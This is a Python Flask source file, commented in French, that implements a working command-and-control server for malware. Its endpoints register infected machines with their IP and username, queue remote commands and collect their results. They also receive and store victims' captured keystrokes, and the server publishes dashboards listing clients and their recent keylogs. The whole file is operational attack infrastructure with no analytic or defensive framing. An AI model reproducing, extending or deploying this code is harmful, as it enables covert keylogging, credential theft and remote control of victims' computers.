from flask import Flask, request, jsonify
import time
import threading
from datetime import datetime
import os
import json
from config import ENCRYPTION_KEY
from encryptor import Encryptor
from protocol import Protocol

app = Flask(__name__)

# Stockage en mémoire
clients = {}
pending_commands = {}
command_results = {}
keylogs_storage = {}

encryptor = Encryptor(ENCRYPTION_KEY)

# Fichier de backup keylogs (optionnel)
KEYLOGS_FILE = "keylogs_backup.json"

# On désactive la base de données pour simplifier (tu pourras la remettre si besoin)
USE_DATABASE = False

# Chargement / sauvegarde keylogs simplifiée (fichier uniquement)
def load_keylogs():
    global keylogs_storage
    if os.path.exists(KEYLOGS_FILE):
        try:
            with open(KEYLOGS_FILE, 'r', encoding='utf-8') as f:
                keylogs_storage = json.load(f)
            print(f"[STORAGE] Chargement de {len(keylogs_storage)} clients depuis {KEYLOGS_FILE}")
        except:
            keylogs_storage = {}
            print("[STORAGE] Erreur lecture backup → démarrage vide")
    else:
        print("[STORAGE] Pas de fichier backup trouvé")

def save_keylogs():
    try:
        with open(KEYLOGS_FILE, 'w', encoding='utf-8') as f:
            json.dump(keylogs_storage, f, ensure_ascii=False, indent=2)
        print(f"[STORAGE] Sauvegarde effectuée ({sum(len(v) for v in keylogs_storage.values())} logs)")
    except Exception as e:
        print(f"[STORAGE] Erreur sauvegarde : {e}")

load_keylogs()

# Thread de nettoyage léger
def cleanup_old_clients():
    while True:
        now = time.time()
        to_remove = [cid for cid, data in clients.items() if now - data.get('last_seen', 0) > 3600*2]
        for cid in to_remove:
            clients.pop(cid, None)
            print(f"[CLEANUP] Client supprimé (inactif > 2h) : {cid}")
        time.sleep(300)

threading.Thread(target=cleanup_old_clients, daemon=True).start()

# ────────────────────────────────────────────────
#                  ROUTES C2 (malware <-> serveur)
# ────────────────────────────────────────────────

@app.route('/register', methods=['POST'])
def register_client():
    try:
        enc_data = request.json.get('data')
        if not enc_data:
            return jsonify({"data": encryptor.encrypt(Protocol.create_error_message("No data"))}), 400

        data = encryptor.decrypt(enc_data)
        if not data or data.get("type") != Protocol.MSG_REGISTER:
            return jsonify({"data": encryptor.encrypt(Protocol.create_error_message("Invalid type"))}), 400

        cid = data.get("client_id")
        if not cid:
            return jsonify({"data": encryptor.encrypt(Protocol.create_error_message("No client_id"))}), 400

        ip = request.headers.get('X-Forwarded-For', request.remote_addr) or request.remote_addr
        system_info = data.get("system_info", {})

        clients[cid] = {
            'system_info': system_info,
            'ip': ip,
            'first_seen': time.time(),
            'last_seen': time.time(),
            'checkin_count': 1
        }

        print(f"[+] NOUVEAU CLIENT : {cid} | {ip} | {system_info.get('platform','?')}")

        save_keylogs()  # au cas où
        return jsonify({"data": encryptor.encrypt(Protocol.create_success_message("ok"))})

    except Exception as e:
        print(f"[REGISTER ERROR] {e}")
        return jsonify({"data": encryptor.encrypt(Protocol.create_error_message(str(e)))}), 500


@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        enc = request.json.get('data')
        data = encryptor.decrypt(enc or "")
        if not data or data.get("type") != Protocol.MSG_HEARTBEAT:
            return jsonify({"data": encryptor.encrypt(Protocol.create_error_message("Invalid"))}), 400

        cid = data.get("client_id")
        if cid in clients:
            clients[cid]['last_seen'] = time.time()
            clients[cid]['checkin_count'] = clients[cid].get('checkin_count', 0) + 1

        return jsonify({"data": encryptor.encrypt(Protocol.create_success_message())})
    except:
        return jsonify({"data": encryptor.encrypt(Protocol.create_error_message("Error"))}), 500


@app.route('/commands', methods=['POST'])
def get_commands():
    try:
        enc = request.json.get('data')
        data = encryptor.decrypt(enc or "")
        if not data or data.get("type") != Protocol.MSG_GET_COMMANDS:
            return jsonify({"data": encryptor.encrypt(Protocol.create_error_message("Invalid"))}), 400

        cid = data.get("client_id")
        if not cid:
            return jsonify({"data": encryptor.encrypt(Protocol.create_error_message("No client_id"))}), 400

        cmds = pending_commands.pop(cid, [])  # on envoie et on supprime

        return jsonify({"data": encryptor.encrypt({"type": "commands", "commands": cmds})})
    except:
        return jsonify({"data": encryptor.encrypt(Protocol.create_error_message("Server error"))}), 500


@app.route('/commands_result', methods=['POST'])
def submit_command_result():
    try:
        enc = request.json.get('data')
        data = encryptor.decrypt(enc or "")
        if not data or data.get("type") != "command_result":
            return jsonify({"error": "Invalid format"}), 400

        cid = data.get("client_id")
        cmd_id = data.get("command_id")
        result = data.get("result")

        if cmd_id and result is not None:
            command_results[cmd_id] = {
                "client_id": cid,
                "result": result,
                "received_at": datetime.now().isoformat()
            }
            print(f"[RESULT] {cmd_id} reçu de {cid} → {str(result)[:120]}")

        return jsonify({"success": True})
    except Exception as e:
        print(f"[RESULT ERROR] {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/keylog_data', methods=['POST'])
def receive_keylog_data():
    try:
        enc = request.json.get('data')
        data = encryptor.decrypt(enc or "")
        if not data or data.get("type") != "keylog_data":
            return jsonify({"error": "Invalid type"}), 400

        cid = data.get("client_id")
        logs = data.get("logs", [])

        if cid and logs:
            if cid not in keylogs_storage:
                keylogs_storage[cid] = []
            keylogs_storage[cid].extend(logs)

            # Limite mémoire
            if len(keylogs_storage[cid]) > 2000:
                keylogs_storage[cid] = keylogs_storage[cid][-2000:]

            if cid in clients:
                clients[cid]['last_seen'] = time.time()

            print(f"[KEYLOG] {len(logs)} touches de {cid} (total: {len(keylogs_storage[cid])})")
            save_keylogs()

        return jsonify({"success": True, "received": len(logs)})
    except Exception as e:
        print(f"[KEYLOG ERROR] {e}")
        return jsonify({"error": str(e)}), 500


# ────────────────────────────────────────────────
#         Routes JSON simples pour le navigateur
# ────────────────────────────────────────────────

@app.route('/')
def home():
    online = sum(1 for c in clients.values() if time.time() - c.get('last_seen', 0) < 60)
    return f"""C2 SERVER ACTIF
──────────────
Date/Heure : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Clients    : {len(clients)} (online ≈ {online})
Keylogs    : {sum(len(v) for v in keylogs_storage.values())}

Endpoints JSON :
  /status           → état global
  /clients          → liste clients
  /keylogs/recent   → derniers keylogs
""", 200, {'Content-Type': 'text/plain; charset=utf-8'}


@app.route('/status')
def status_json():
    now = time.time()
    online_count = sum(1 for c in clients.values() if now - c.get('last_seen', 0) < 60)

    return jsonify({
        "status": "online",
        "timestamp": datetime.now().isoformat(),
        "uptime_seconds": int(now - app.start_time) if hasattr(app, 'start_time') else 0,
        "clients_total": len(clients),
        "clients_online": online_count,
        "keylogs_total": sum(len(v) for v in keylogs_storage.values()),
        "clients_with_logs": len(keylogs_storage),
        "pending_commands": sum(len(v) for v in pending_commands.values())
    })


@app.route('/clients')
def clients_json():
    now = time.time()
    data = []

    for cid, info in clients.items():
        data.append({
            "client_id": cid,
            "ip": info.get("ip", "unknown"),
            "os": info.get("system_info", {}).get("platform", "unknown"),
            "username": info.get("system_info", {}).get("username", "unknown"),
            "last_seen": datetime.fromtimestamp(info.get("last_seen", 0)).isoformat(),
            "seconds_ago": int(now - info.get("last_seen", 0)),
            "online": now - info.get("last_seen", 0) < 60,
            "checkins": info.get("checkin_count", 0)
        })

    return jsonify({
        "count": len(data),
        "clients": sorted(data, key=lambda x: x["seconds_ago"])
    })


@app.route('/keylogs/recent')
def keylogs_recent():
    all_logs = []
    for cid, logs in keylogs_storage.items():
        for log in logs[-6:]:  # 6 derniers par client
            all_logs.append({
                "client_id": cid,
                "timestamp": log.get("timestamp"),
                "text": log.get("text", "").strip()[:140],
                "age_seconds": int(time.time() - datetime.fromisoformat(log.get("timestamp", "2000-01-01T00:00:00")).timestamp())
            })

    all_logs.sort(key=lambda x: x.get("timestamp", ""), reverse=True)

    return jsonify({
        "total_keylogs": sum(len(v) for v in keylogs_storage.values()),
        "recent_logs": all_logs[:40]  # max 40 derniers
    })


# Start time
app.start_time = time.time()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"\nC2 serveur lancé sur port {port}")
    print(f"→ http://127.0.0.1:{port}/status")
    print(f"→ http://127.0.0.1:{port}/clients")
    print(f"→ http://127.0.0.1:{port}/keylogs/recent\n")

    app.run(host='0.0.0.0', port=port, debug=False)
